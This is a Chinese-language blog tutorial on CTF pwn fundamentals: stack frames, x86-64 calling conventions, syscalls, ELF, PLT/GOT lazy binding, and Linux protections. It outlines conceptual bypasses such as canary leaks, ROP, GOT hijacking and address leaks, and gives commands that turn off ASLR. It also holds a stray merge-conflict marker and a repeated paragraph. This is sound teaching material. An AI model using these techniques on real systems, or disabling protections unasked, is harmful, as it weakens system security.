edx, 22 ; 要输出的字符串的长度 int 0x80 ; 调用系统调用 ; 退出程序 mov eax, 1 ; 系统调用号1代表退出程序 xor ebx, ebx ; 返回值为0 int 0x80 ; 调用系统调用 Linux基础 这一章内容多是一些文字描述，也会有生活案例加以理解，图片较少，较为枯燥。\n保护层级：分为四个ring0-ring3。一般来说就两个：0为内核，3为用户。\n权限：用户分为多个组\n文件和目录等等的权限一般都是三个，即可读可写可执行， 读：R，写：W，执行：X\n赋予一个可执行文件执行权限就是chmod +x filename\n操作系统 在第一阶段学习中我们接触到了Linux操作系统的相关指令：\n名称 作用 示例（以Kali虚拟机为例） ls 列出当前目录文件 ls cd 切换目录 cd/home/ctf pwd 打印当前目录 pwd touch 创建空白文件 touch flag mkdir 创建目录 mkdir /home/ctf rmdir 删除目录 rmdir /home/ctf rm 删除文件 rm flag cp 复制文件 cp /home/ctf/flag /home/flag mv 移动文件 mv flag /home/ctf/flag cat 输出文件内容 cat flag diff 比较两个文件信息 diff flag1 flag2 chmod 切换执行权限 chmod 777 elf1 locate 查找文件 locate flag 数据存储 计算机内部有两种数据的存储形式：大端序、小端序。\n大端序：数据高位存储在计算机地址的低位，数据低位存储在地址的高位。\n小端序：数据高位存储在计算机地址的高位，数据低位存储在地址的低位。\n大端序：高低低高\n小端序：高高低低\n这时我也看不懂，上例子！\n我们以一个数据：0x123456789abcdef；那么0为低地址，7为高地址。\n大端序存储：低位储存到计算机地址高位\u0026hellip;\n0 1 2 3 4 5 6 7 01 23 45 67 89 ab cd ef 将此数据按照字符串输出，得到：\\x01\\x23\\x45\\x67\\x89\\xab\\xcd\\xef\n小端序存储：低位储存到计算机地址的低位\u0026hellip;\n0 1 2 3 4 5 6 7 ef cd Ab 89 67 45 23 01 将此数据按照字符串输出，得到：\\xef\\xcd\\xab\\x89\\x67\\x45\\x23\\x01\n从上面这两种方式比较的话，可以知道，大端序符合人类的阅读习惯；但从存储逻辑、数学运算规律来看，小端序更正常。\nLinux数据存储的格式为小端序\nLinux是小端序储存，所以我们以字符串的形式输入一个数字时，要注意格式，比如输入0xdeadbeef这个数字。\n字符串输入就是“\\xef\\xbe\\xad\\xde”传入给程序。不过好在有pwntools，p32(0xdeadbeef)即可完成自动转换。\n文件描述符 Linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行 I/O 操作的系统调用都会通过文件描述符。\n每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件。\n相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。\n我们会在open、read、write这些常见函数中见到。\n0标准输入（stdin）、1标准输出（stdout）、2标准错误（stderr）read(0,buf,size）从stdin中读size个数据到buf中，write(1,buf,size)从buf中取size个数据到stdout中。\n栈（stack） 学过数据结构都知道，这是一种储存方式：是一种遵循「后进先出（LIFO, Last In First Out）」原则的线性数据结构，类似于日常生活中堆叠的盘子 —— 最后放上去的盘子，会被最先取走。\n栈的核心特性： 操作受限：只能在栈的一端（通常称为「栈顶」）进行数据的插入（称为「入栈」或 push）和删除（称为「出栈」或 pop），另一端（「栈底」）固定不动。\n由于函数调用顺序也是LIFO，所以我们能接触到的绝大多数系统，都是通过栈这一数据结构来维护函数调用关系。\n顺序访问：只能从栈顶开始依次访问元素，无法直接访问栈中间或栈底的元素。\n说得我都懵了，这啥？？通俗讲就是栈好比是一个薯片罐，只有一个罐口，把薯片装进去后，最后放的薯片总是被第一个拿出来，倒数第二个被放进去的，在后面被打开时都是第二个先被拿出来，这就是栈的顺序访问特点啦，而栈就是薯片罐这种存储器的名字。\n等会？这放到机器语言如C语言的话，不就是数组吗？为什么那么麻烦要发明这个栈呢？就是方便一些，一把普通菜刀能切水果、剁骨头，为什么要发明水果刀和大砍刀？原因就是方便。\n栈其实就是一个“阉割版”的数组，只能在一头操作。\nLinux种的栈 在linux系统中，系统为每一个进程都安排了一个栈，进程中每一个调用的函数都有自己独立的栈帧。\n在linux系统中，栈是由高地址向低地址生长（小端序）。\n换句话说,高地址为栈底，低地址为栈顶。那么为什么这么反直觉反人类的安排呢？ 我们接触到的一些算法，很多都是用栈来实现的，比如DFS。DFS会将发现的节点存储在栈中，然后访问的顺序就是LIFO。但是很多这种LIFO的算法都会以递归的形式实现。其实，递归的形式实现这些算法本质上来说也是利用栈结构，只不过他没有在程序中另外申请一个栈，而是用的函数调用栈。\n为什么栈从高地址向低地址生长？ 有的说法是这么设计和小端序更配合（比如说访问一个数据的低字节）。\n这里我的认知有限，我也不能解答，过于理论化研究也是很牢的。这只能留到未来的自己去解答了，这里先标记一下以后再单独出一篇Blog文章来讲解。只能先死记一下咯/************。\n调用约定 看标题就是关于函数调用的内容，在上一章汇编指令就有预示了，像call调用函数地址、jmp无条件跳转。\n再来回顾下栈的指令：\npop出栈/弹栈，Pop指令的作用是弹栈，将栈顶的数据弹出到寄存器，然后栈顶指针向下移动一个单位。具体来说：如pop rax，作用就是mov rax [rsp]；add rsp 8（平衡栈指针：当手动修改栈指针后（如临时分配栈空间），用 add rsp, 8 恢复栈的对齐状态，确保后续操作符合 8 字节对齐要求）；\npush压栈，Push指令的作用就是压栈，将栈顶指针向上移动一个单位的距离，然后将一个寄存器的值存放在栈顶，具体来说：如push rax，其实际效果就是：sub rsp 8; mov [rsp] rax；\nadd rsp 8的8怎么来的？在 x86-64 架构（64 位系统）中： 寄存器（如 rsp、rax 等）是 64 位（8 字节）的。内存地址也是 64 位的，最小的可寻址单位是字节，但栈操作通常以8 字节为单位进行对齐（这是系统调用和函数调用的标准要求）。\n函数调用流程 从一个实例出发,main调用func_b, func_b调用func_a。我们从main函数开始，逐步分析栈帧变化:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void func_a() { //do sth return; } void func_b() { func_a(); dunc_a(); int c = 1; return; } int main() { func_b(); int a = 2; return 0; } 当运行到call func b时main函数的栈帧。Rbp指向栈底,rsp指向栈底 这段栈帧存放了一些main的局部变量。 main函数要调用func b，main只需要call func b， 也就是push rip；mov rip func b；\n那么此时跳转到func_b继续执行，func _b直接执行主逻辑吗？ 显然不是的，被调用函数还需要维护栈帧。\n具体来说，需要以下几步：\npush rbp；将调用函数的栈底指针保存。\nmov rbp rsp；将栈底指针指向现在的栈顶。\nsub rsp xxx；开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底。\n图很明了了吧。但我起初一看，为什么int a =2所在地址要高于fun_b函数？不是funb函数要先比int a=2先执行吗？\n自问自答：要理解这个问题，需结合函数调用栈的生长方向和代码执行顺序与栈帧分配的关系来分析，栈是从高地址向低地址生长的\n代码执行顺序是：main → func_b → func_a → 返回 func_b → 定义 int c = 1 → 返回 main → 定义 int a = 2。\n因为每个函数调用通常会占用一个栈帧，所以说fun_b函数会被分配在main函数之下（main函数先执行，固然main是位于高地址），而int a = 2 属于 main 栈帧的局部变量，因此地址高于 func_b 的栈帧。\n来我们继续分析这图，func_b执行完维护栈帧操作后的栈布局。 所谓栈帧的维护就是维护rbp和rsp两个指针。 Rsp永远指向当前栈的顶部（Rsp在哪和栈顶在哪关系不大，但Rsp是指向它所在的栈帧的顶部）。 Rbp用来定位局部变量。\n接着，再往下运行程序，调用func_a函数。\n那这里的每一个栈帧就代表我之前所说的薯片啦，一片片被拿出来，一个个运行。\nfunc_b调用完func_a后的栈布局。至此，示例的函数调用已经完毕。 现在，func_a执行完毕，要返回了。如何维护栈帧呢?\n在这里，我们学习一个新的汇编指令leave：\n\u0026laquo;\u0026laquo;\u0026laquo;\u0026lt; HEAD 作用是维护栈帧，通常出现在函数的结尾，与ret（return）连用。其实际作用为：mov rsp rbp；pop rbp；即：将栈顶指针指向栈帧的底部、然后在栈中弹出新的栈底指针。\n在一个函数执行结束返回时，会执行leave；ret；\n实际效果就是：mov rsp rbp； poprbp； pop eip； 此时我们观察程序执行完func_a时的栈帧，如下图：\n可以说，与之前的func_b未调用func_a前的栈帧对比，是一模一样，说明已经恢复了栈帧。唯一不同之处在于此时程序的rip已经指向了c=1后面一条指令，说明func_a已经执行完毕。\n以此类推，func_b执行完毕返回后，栈布局如下图：\n在这之后，main函数继续执行此时布局变回开始执行程序时的栈布局，直到结束。至此，函数的调用返回执行流程结束。\n总结：\n调用函数：只需要将rip压栈（保存到当前栈帧），即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp；mov rbp rsp； sub rsp 0xxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧,返回调用函数的返回地址。\n这里有个疑问，为什么在调用过程种，寄存器rsp这类会出现很多的赋值操作，比如上述的“mov rsp rbp；pop rbp；pop rip”，rsp更像是一个中间变量，一直变化。其实这是有原因的。\nrsp 看似动态变化，但它的变化是完全遵循栈操作的逻辑和函数调用约定的。栈是一种后进先出的数据结构，在函数调用过程中，参数入栈、局部变量分配内存（通过调整 rsp 来实现）、保存寄存器值等操作，都需要通过修改 rsp 的值来改变栈顶位置，以完成对栈内存的合理使用和管理 。而在函数返回阶段，又要通过调整 rsp 来恢复之前的栈状态，释放当前函数占用的栈空间。\n而rbp 明确划分了当前函数栈帧的范围：从 rbp（底部）到 rsp（顶部）之间的内存区域，它更像是一个固定的描点，数值不变依靠rsp变化来完成操作。\n所以，这些寄存器的赋值操作都是为了严格按照计算机体系结构和编程语言的函数调用规范，实现函数调用、执行和返回过程中的内存管理、数据保护以及程序执行流的正确控制。\n简单说，rsp 是 “动态变化的栈顶指针”，而 rbp 是 “固定不动的栈帧基准”—— 前者负责管理栈的实时状态，后者负责锚定当前栈帧的位置和范围、栈帧的局部变量，二者配合实现了函数调用过程中内存的有序管理。\n调用约定 返回值：一般来说,一个函数的返回值会存储到RAX寄存器。 X86-64函数的调用约定为：\n从左至右参数一次传递给rdi、rsi、rdx、rcx、r8、r9。\n如果一个函数的参数多于6个，就不在寄存器传参了，而是从右至左压入栈中传递。\n作用是维护栈帧，通常出现在函数的结尾，与ret（return）连用。其实际作用为：mov rsp rbp；pop rbp；即：将栈顶指针指向栈帧的底部、然后在栈中弹出新的栈底指针。\n系统调用 syscall指令，用于调用系统函数，调用时需要指明系统调用号码。系统调用号存在 rax 寄存器中，然后布置好参数，执行syscall即可。\n调用号码 名称 0 read 1 write 2 open 3 close 9 mmap 37 alarm 60 exit 62 kill 59 execv 还有一些调用号码没列出来，其实上网查一查就行，这东西用多了就记住了，前期不用刻意死记硬背的。\n看到这里，是不是有点熟悉，看过《第一阶段》的操作系统章节就知道，有chmod 777 \u0026lt;文件\u0026gt;：设定文件使用权限的指令。正好就是1+2+4，4代表是x执行权限，这里表格没写出来。所以入门pwn我就建议大家去学那个Linux操作系统，基础过一下，不用精通，不然你强行入门PWN很懵的。\n示例：调用read(0,buf,size)：\n从左至右参数一次传递给rdi、rsi、rdx、rcx、r8、r9（寄存器）\n1 2 3 4 5 mov rax 0; read\u0026#39;s syscall number mov rdi 0; first arg mov rsi buf; second arg mov rdx size; third ard syscall; execute read(0,buf,size); ELF文件 elf linux环境中，二进制可持性文件的类型是ELF（Executable and Linkable Format）文件。\nelf文件的格式比较简单，我们需要了解的就是elf文件中的各个节、段等概念。elf的基本信息存在于elf的头部信息中，这些信息包括指令的运行架构、程序入口等内容，可以通过readelf -h \u0026lt;elf_name\u0026gt;来查看头部信息，当然打过CTF-MISC的知道的话估计会去用010editor，都可。\n第二第三张图就是ELF文件了，这种文件并不是常规的ZIP这些噢。\nelf文件中包含许多个节（section），各个节中存放不同的数据，这些节的信息存放在节头表中，readelf -S \u0026lt;file\u0026gt;查看，这些节主要包括：\n名称 作用 .text 存放程序运行的代码 .rdata 存放一些如字符串等不可修改的数据 .data 存放已经初始化的可修改的数据 .bss 存放未被初始化的程序可修改的数据 .plt 与 .got 程序动态链接函数地址 elf文件不是我们所说的常规文件，不在我们的电脑桌面上，而是存在磁盘文件里，它本质上是存储在磁盘（硬盘、SSD 等）上的 “常规文件”，运行程序时，这个程序的elf文件才会加载到内存里，这就是我们所说的运行内存。\nelf文件在加载进入内存时： elf文件的节（section）会被映射进内存中的段（segment），而这一映射过程遵循的机制是根据各个节的权限来进行映射的。\n换句话说，可读可写的节被映射入一个段，只读的节被映射入一个段。\n单个elf文件内部多个节被合并映射入一个段，此时就标志着elf文件被启动运行了。\n根据上述讲解，可以知道ELF文件以两种状态存在：\n状态 存储位置 用途 能否被CPU直接执行 未运行时 磁盘 保存程序的指令和数据（静态文件） 不能（CPU只认识内存数据） 运行时 运行内存 CPU从内存读取指令并执行 能 In other words，ELF 文件是 “程序的静态载体”（存磁盘），确保程序能从源代码正确转换为可执行文件，并在内存中被正确加载和运行。\nlibc 什么是libc?\nglibc是linux下面C标准库的实现，全称GNU C Library。\nglibc本身是GNU旗下的C标准库，后来逐渐成为了Linux的标准C库，而Linux下原来的标准C库Linux libc逐渐不再被维护。\nLinux下面的标准C库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。\n等等\u0026hellip;\u0026hellip;so后缀？？.so时啥文件，本质上也是个elf文件\n通常.so用./的指令运行后会给出版本信息，当然，用file命令也是可以的:\nLinux基本上所有的程序都依赖libc，所以libc中的函数至关重要。当然CTFpwn也离不开libc：IDA分析libc、源码。\n延迟绑定机制 在上章的elf文件，看到了.got和.plt文件，用于动态链接函数地址。\n动态链接库 我们程序开发过程中都会用到系统函数，比如read，write， open等等。这些系统函数不需要我们实现,因为系统已经帮你完成这些工作，只需要调用即可，存放这些函数的库文件就是动态链接库。通常情况下，我们对于PWN接触到的动态链接库就是libc.so文件。\n静态编译和动态编译 这里我们举一个例子来类比静态编译与动态编译的概念：\n小明要开一个餐馆（program），餐馆的菜单上有几百种菜肴（函数），小明的餐馆每天都会来很多顾客，每个顾客点的菜都可能不一样。我们知道，每道菜所需要的食材（系统函数）都不一样，这些食材都存放于仓库（动态链接库）中。\n那么现在问题来了，小明如何保证每个顾客点的菜都能被满足呢？\n第一种方式：小明把仓库中所有的食材都搬进厨房（静态编译）这时，小明不需要挪地方（静态），只需要在厨房中就可以工作，但是 这会带来冗余，可能厨房中的食材很多都用不上。高效\n第二种方式：小明每次遇到新的所需要的食材，才去仓库取（动态编译）。这时，小明可能挪动的比较频繁（动态），但是可以保证厨房面没那么多可能用不到的东西。全面\n一个程序运行过程中可能会调用许许多多的库函数，这些库函数在一次运行过程中不能保证全部被调用。\n静态编译的思路就是将所有可能运行到的库函数一同编译到可执行文件中。这一方式的优点就在于在程序运行中不需要依赖动态链接库。适用的场合就是比如你本地编译的程序需要的动态链接库版本比较特殊，如果在别的机器上运行可能对方动态链接库版本和你不一样会出bug，这时候用静态编译。\n缺点就是变异过后程序体积很大，编译速度也很慢。\n对于动态编译，优点是缩小了执行文件本身的体积，另一方面是加快了编译速度，节省本地的系统资源。\n缺点是使用链接库的命令，需要附带相对庞大的链接库，如果其他计算机没有安装对于的运行库，则动态编译的可执行文件就不能运行。\n欸欸看回小明，他要选第二种方式（动态编译），但每次去仓库找食材太麻烦了，而且仓库这么大，，于是他用小本本记下了在仓库的每样食材的位置（got表），下一次找这件食材就高效多了。这就是got。\n延迟绑定 这就是linux的延迟绑定机制，而存放这个地址的小本子就是got表。got表全程是Global Offset Table，也就是全局偏移量表。\n在程序运行时，got表初始并不保存库函数的地址，只有在第一次调用过后，程序才将这一地址保存在got表中。\nPLT与GOT GOT（Global Offset Table，全局偏移表）：数据段用于地址无关代码的 Linux ELF 文件中确定全局变量和外部函数地址的表。\nPLT（Procedure Linkage Table，程序链接表）： Linux ELF 文件中用于延迟绑定的表。\nELF 中有.got和.plt.got 两个 GOT 表，got 表用于全局变量的引用地址，.got.plt 用于保存函数引用的地址。\n不论是第几次调用外部函数，程序真正调用的其实是plt表。plt表其实是一段段汇编指令构成。\nPLT 工作流程 在第一次调用外部函数时，plt表首先会跳到对应的got表项中。由于并没有被调用过，此时的got表存储的不是目标函数地址，此时的got表中存储的地址是pt表中的一段指令，其作用就是准备一些参数，进行动态解析。跳转回plt表后，plt表又会跳转回plt的表头，表头内容就是调用动态解析函数，将目标函数地址存放入got表中。\n第一次调用外部函数，以调用C语言的printf为例子去详细讲解：\n1、调用时，汇编语言执行到call printf时，先跳向PLT表中printf对应的条目（plt[printf]），这么说好像起到jmp跳转地址的作用啊。只是类似，并未跳转地址，而此时编译还不知道，而是先跳转PLT表中位该函数预留的一个”小跳板“（plt[printf]）。\n2、**plt[printf]**第一次被调用时，此时GOT表中还没被填充真实地址（因为此前没有被解析过），所以里头并不是printf的真实地址，而是plt[printf]中下一条指令的地址（也就是jmp*GOT[printf]）。\ncall printf → 跳向plt[printf] → 执行jmp *GOT[printf] → 此时GOT[printf]里已是真实地址，直接跳过去执行。此时就知道printf的真实地址了。\n3、**跳回PLT后，执行”准备解析参数“的指令。**plt[printf]的下一条指令是准备动态解析需要的参数：比如把printf对应的符号索引（用于告诉动态链接器 “要解析哪个函数”）压入栈中。这些参数是提前在编译时就写好的，目的是告诉动态链接器 “我要找的是printf，帮我查它的真实地址”。这些参数是提前在编译时就写好的，目的是告诉动态链接器 “我要找的是printf，帮我查它的真实地址”。\n4、**跳向PLT表头（plt[0]），触发动态链接器的解析函数。**准备好参数后，plt[printf]会跳向 PLT 表的 “表头”（plt[0]）。plt[0]里的指令是固定的：先把GOT[0]的地址压栈（GOT[0]存储着动态链接器需要的辅助信息），然后调用动态链接器的核心解析函数（_dl_runtime_resolve）。\n？？？这有个疑问，怎么会有函数来帮助外部函数如printf去确定地址呢？其实这个_dl_runtime_resolve函数比较特殊，它是动态链接器的组成部分，是已经预先存在于动态链接器的代码之中的，动态链接器一加载，它的地址就被先解析出来了。\n5、动态链接器解析出真实地址，写入 GOT 表，完成绑定\n以下是用汇编语言代码来概括这五步流程：\n1 2 3 4 plt[printf]: jmp *GOT[printf] ; 第1行：跳向GOT[printf]存储的地址 push 0x123 ; 第2行：压入printf的符号索引（假设是0x123） jmp plt[0] ; 第3行：跳向PLT表头 这五步也就系统概括了小明在厨房做菜麻烦需要用小本本记下仓库的所需食材的存放地方（地址）的过程。\n总结：PLT 和 GOT 的协作核心\nPLT 是 “跳板”：负责第一次调用时触发解析流程，后续调用时直接转发到 GOT 中的真实地址。\nGOT 是 “缓存表”：第一次调用时存储 PLT 内的跳转地址（用于触发解析），解析后存储函数真实地址（供后续直接调用）。 整个机制的目的是 “延迟解析”：避免程序启动时解析所有外部函数（耗时），只在第一次调用时解析，平衡启动速度和运行效率。\n理解了这个流程，就掌握了动态链接中最核心的 “懒绑定” 机制，这也是 CTFpwn 中 “PLT 劫持” 等漏洞利用的基础。\nLinux安全防护机制 栈溢出、指针悬挂、内存地址泄露等Bug会导致程序崩溃，一些攻击者会刻意制造这些漏洞来扰乱程序正常执行，这就是早期PWN的威力。这一章比较重要，几乎贯穿后续栈溢出、堆的题目。\n保护机制 CANARY、NX、ASRL、PIE、RELRO\n栈的作用为存储函数调用相关信息以及函数的局部变量。\n这些局部变量通常为数组或者输入的缓冲区（buf）。而函数调用相关的信息，主要是返回地址和栈底指针（rbp）。\nCANARY Canary中文翻译就是金丝雀，来源是之前科技不发达时，矿工会在下井作业时带一个金丝雀，用来判断地下环境有没有煤气之类的毒气泄漏，金丝雀没事，大家继续干活；金丝雀如果死了，大家赶紧跑。\n在Linux中，Canary的作用就如同他引用的一样，用来判断程序的执行环境，主要是针对检测栈溢出。\ncanary是一个开头字节为\\x00的一段长度为八个字节(x64)的随机数，这个随机数本体存放于 fs 段偏移为 0x28 的区域。\n在每次函数调用中，程序都会将这段随机数存放于栈底，每次运行结束返回时，都会将这一随机数与他的本体进行比对。如果这个值被改变，则意味着发生了栈溢出，程序直接退出，没有改变的话，程序继续执行。\n由于canary开头字节为x00，所以通常情况下不能被打印出来。\n通常情况下，程序如果开启了canary保护，大概率说明这道题目不是栈溢出题目了。当然也要具体情况具体分析。\n绕过方法主要就是修改canary或者泄漏canary。\n泄漏 canary：利用格式化字符串、栈溢出 + 输出功能等漏洞，读取栈上的 canary 值（注意首字节 \\x00 的影响）。\n修改 canary：用泄漏的 canary 值，在栈溢出时覆盖栈上的 canary，使其与原始值（fs:0x28 处）一致，绕过检查。\nNX NX意思就是Not Executable，开启这个保护后，程序中的堆、栈、bss段等等可写的段就不可以执行。这就意味着如果开启了NX保护，通常情况下我们就不能执行我们自己编写的shellcode。\n绕过的方式通常是用mprotect函数来改写段的权限，nx保护对于rop或者劫持got表利用方式不影响。\nPIE和ASLR 在我们编写ROP或者shellcode时，有一个问题是绕不开的，那就是找到函数地址：\nPIE指的就是程序内存加载基地址随机化，意味着我们不能一下子确定程序的基地址。\nASLR与PIE大同小异，ASLR是程序运行动态链接库、栈等地址随机化。\n通常来说，CTF中的PWN题与这两个保护打交道的次数最多。\n绕过方式就是泄露函数地址，然后通过函数的偏移来确定基地址。\nPIE：是针对可执行文件本身的编译选项。开启后，可执行文件（ELF）会被加载到内存中的随机地址，其内部的代码段、数据段等位置不再是固定值（编译时不指定绝对地址，而是用相对偏移）。 作用：让攻击者无法预先知道程序代码、全局变量等在内存中的绝对地址。\nASLR：是操作系统级别的保护机制。开启后，操作系统会随机化进程的内存布局，包括共享库（.so）的加载地址、栈、堆、内核映射区域等的起始地址。 作用：让攻击者无法预测共享库函数（如 libc 中的 system）、栈 / 堆数据的内存地址。\n该文件只有 3 种合法取值，分别对应不同的 ASLR 策略，具体如下：\n取值 名称 作用（随机化范围） 安全强度 0 关闭ASLR 完全不随机化：栈、堆、共享库、内核空间的地址每次运行都固定不变。 最低 1 部分随机化（默认） 部分区域随机：栈地址、VDSO（虚拟动态共享对象）地址随机化；堆、共享库地址不随机。 中等 2 完全随机化 全区域随机：栈、堆、共享库、VDSO 地址全部随机化；64 位系统还会随机化内核空间。 最高 1）查看当前 ASLR 状态\n1 2 # 读取文件内容，输出 0/1/2 中的一个 cat /proc/sys/kernel/randomize_va_space （2）临时修改 ASLR 强度\n1 2 3 4 5 6 # 1. 关闭 ASLR sudo echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space # 2. 恢复默认部分随机化 sudo echo 1 \u0026gt; /proc/sys/kernel/randomize_va_space # 3. 开启完全随机化（高安全需求） sudo echo 2 \u0026gt; /proc/sys/kernel/randomize_va_space ​\n关联：两者通常配合使用 ——PIE 让可执行文件本身地址随机化，ASLR 让系统其他内存区域随机化，共同增加内存地址预测难度。\n区别核心：PIE 是编译时决定的程序属性，ASLR 是系统运行时的布局策略。\n通俗点理解：\nASLR 是操作系统搞的 “整体大洗牌”：每次程序运行时，系统会把整个内存空间的布局（比如共享库放哪、栈和堆从哪开始）随机换个位置，让攻击者猜不到常用函数（比如 system）或数据的具体地址。 ASLR 像每次开演唱会时，场馆里的座位区（共享库）、后台（堆）、观众入口（栈）的位置都随机换。\nPIE 是针对单个程序的 “自身随机化”：如果程序编译时开了 PIE，它自己加载到内存时，代码和数据会随机放在一个不确定的位置（而不是固定地址），让攻击者连程序自己的函数、变量在哪都猜不准。 PIE 像演出团队（程序本身）每次上场时，自己的站位（代码和数据）也随机变。\nRELRO RELRO（Relocation Read-Only，重定位只读）是一种针对 ELF 文件重定位表的保护机制，核心作用是限制对 GOT（全局偏移表）等重定位相关区域的修改权限，防止攻击者通过篡改 GOT 表实现函数劫持（如修改printf的 GOT 条目为system地址）。\n这个保护主要针对的是延迟绑定机制，意思就是说got表这种和函数动态链接相关的内存地址，对于用户是只读的。\n开启了这个保护，意味着我们不能劫持got表中的函数指针。\nRELRO 的两种模式及作用:\nPartial RELRO（部分 RELRO）\n仅将 GOT 表的前半部分（.got.plt）设置为只读，后半部分仍可写。 作用：基本防止对已解析的函数地址（GOT 表中已填充的条目）进行修改，但仍有一定安全隐患。\nFull RELRO（完全 RELRO）\n将整个 GOT 表（包括.dynamic 等重定位相关段）设置为只读，并在程序启动时提前解析所有动态链接符号（关闭延迟绑定）。 作用：彻底阻止对 GOT 表的修改，同时消除延迟绑定可能带来的漏洞（如 PLT 表劫持），但会略微增加程序启动时间。\n总结 以上就是六大章节，因为感觉学着每一章关系好像不是很大，前面elf后面又接个Linux保护机制，感觉很脱节，也可能是我的笔录存在不足，如果你们看到这里又问题的话，欢迎在评论区交流，Blogger会看到的！！！\n在这里总结下：\n汇编语言 讲了些量词：\n名称 翻译 大小 bit 比特 1位（1b） byte 字节 8位（1B） word 字 16位 dword 双字 32位 qword 四字 64位 汇编语言就是机器码的一个助记符，为了让人能看懂\n然后有一些常见寄存器种类需要去了解的，篇幅太长，可以回到上面去看：RBP栈底指针、RAX-R15通用寄存器、RSP栈顶指针、EFLAGS标志寄存器、RIP指令计数器\u0026hellip;\u0026hellip;；各种各样的寻址方式\u0026hellip;\u0026hellip;\n更重要的是认识了一门语言：汇编语言；初步了解一些汇编指令，如操作码、指令类型、实例和C语言运行得到效果比较\u0026hellip;\n溢出\nLinux基础 初步了解Linux的基本内容，保护层级ring、文件描述符、及Linux计算机内部的大端小端序存储形式\n大端序：数据高位存储在计算机地址的低位，数据低位存储在地址的高位。\n小端序：数据高位存储在计算机地址的高位，数据低位存储在地址的低位。\n初步认识栈的定义、作用、在PWN所发挥的威力。\n调用约定 这里重要的是函数调用流程，重点讲解push、pop、call、ret、jmp等汇编指令的使用效果。\n学习调用约定：返回值：一般来说，一个函数的返回值会存储到RAX寄存器。\nX86-64函数的调用约定为：从左至右参数一次传递给rdi，rsi，rdx，rcx，r8，r9。如果一个函数的参数多于6个，则从右至左压入栈中传递。\n系统调用：\n调用号码 名称 0 read 1 write 2 open 3 close 9 mmap 37 alarm 60 exit 62 kill 59 execv ELF文件 elf是 Linux 环境下二进制可执行文件的标准格式，存储在磁盘上，运行时加载到内存包含多个节（如.text 代码节、.data 数据节、.plt/.got 动态链接相关节等），节在加载时按权限合并映射到内存中的段有两种状态：未运行时作为静态载体存于磁盘，运行时加载到内存供CPU 执行。\nlibc是 Linux 下的 C 标准库（最常用的是 glibc），以.so 文件（本质也是 ELF）形式存在（如 /lib/libc.so.6） 包含大量基础函数，是绝大多数程序的依赖，在 CTF Pwn 中具有重要地位。\n两者关系：程序（ELF）运行时会动态链接 libc 中的函数，通过PLT/GOT 等机制实现调用。\n延迟绑定机制 动态链接库与编译方式：\n动态链接库（如 libc.so）存系统函数（read、printf 等），程序无需自己实现，动态调用即可；\n静态编译：把所有可能用到的库函数打包进可执行文件，不依赖外部库但体积大；\n动态编译：仅在调用时从库中取函数，体积小但依赖外部库。\nPLT 与 GOT 的作用和延迟绑定： 为解决动态编译中 “找函数地址” 的效率问题，用 GOT（全局偏移表，像 “小本本”）存函数地址，PLT（程序链接表，像 “跳板”）负责调用逻辑； 延迟绑定：程序启动时不解析所有函数地址，第一次调用时才通过 PLT 触发动态链接器（用_dl_runtime_resolve 函数）解析真实地址，并存入 GOT，后续调用直接读 GOT 即可。\n第一次调用外部函数的流程： 调用函数→跳 PLT 对应条目→GOT 未存真实地址，跳回 PLT 准备参数→跳 PLT 表头触发解析→动态链接器解析地址写入 GOT→后续调用直接用 GOT 地址。\nLinux安全防护机制 保护机制 核心作用 关键特点 绕过方式 CANARY 检测栈溢出 栈底存 8 字节（x64）随机数（首字节 \\x00），返回前比对 先泄漏栈上 canary，再用泄漏值覆盖栈上 canary NX 防 shellcode 执行 栈、堆等可写区域标记为 “不可执行” 用 mprotect 改权限，或用 ROP、GOT 劫持 PIE 程序自身加载地址随机 编译选项决定，每次运行加载地址不同 泄漏程序内函数地址，算基地址 ASLR 系统内存布局随机 系统机制，随机库、栈、堆地址 泄漏库函数地址，算目标函数地址 RELRO 防 GOT/PLT 劫持 分 Partial（.got.plt 只读）、Full（全 GOT 只读） Partial 可攻未保护 GOT 段；Full 弃 GOT 攻其他 结尾 基本的PWN理论知识就到这里了，现在你看别人PWN神的writeup应该不会这么“牢”了吧，基本能看懂别人说的专用词了。\n","date":"2025-08-21T00:00:00Z","image":"https://expl0rer.top/p/pwn-1/PWN_hu_e8782ab2375c9d16.png","permalink":"https://expl0rer.top/p/pwn-1/","title":"PWN-1"},{"content":"不要急我还没搞完\n","date":"2025-08-14T00:00:00Z","permalink":"https://expl0rer.top/p/misc/","title":"MISC"},{"content":"\n[TOC]\n网安学习第一阶段 网络空间安全导论 网络安全行业简介 ⽹络安全（Cyber Security）是指⽹络系统的硬件、软件及其系统中的数据受到保护，不因偶然\n的或者恶意的原因⽽遭受到破坏、更改、泄露，系统连续可靠正常地运⾏，⽹络服务不中断。\n起源与发展 互联网发展迅速。互联⽹（Internet）是⼀种全球性的计算机⽹络。 通过电⼦，⽆线和光纤⽹络等等⼀系列⼴泛的技术连接着全球各地的设备和⼈，它基于⼀组通⽤的协议相互连接，形成逻辑上的单⼀巨⼤国际⽹络。\n互联⽹始于1969年的美国阿帕⽹（ARPANET），最初是为了军事研究⽬的⽽建⽴的。随后，互联⽹逐渐发展成为⼀个覆盖全球的、由各种⽹络相互连接⽽成的庞⼤⽹络。\n网络安全意识与法律法规 法律法规 必须了解下，不然容易迷失自我~~ 中华人民共和国网络安全法.pdf\n网络安全就业 企业需求（哪些岗位需求大、薪资高） 岗位方向 网络安全管理概述 安全运营、运维、模型\n等级保护\n操作系统基础 问：为什么没有鸿蒙系统呢？？因为鸿蒙系统的基层代码开发，使ta本质上属于Linux，即ta的系统内核时Linux的，所以按分类ta属于Linux系统。以下是我认为作为网安人有必要去了解的一些基本操作系统知识，要详细的话还得去上完整课才行，。\nWindows系统 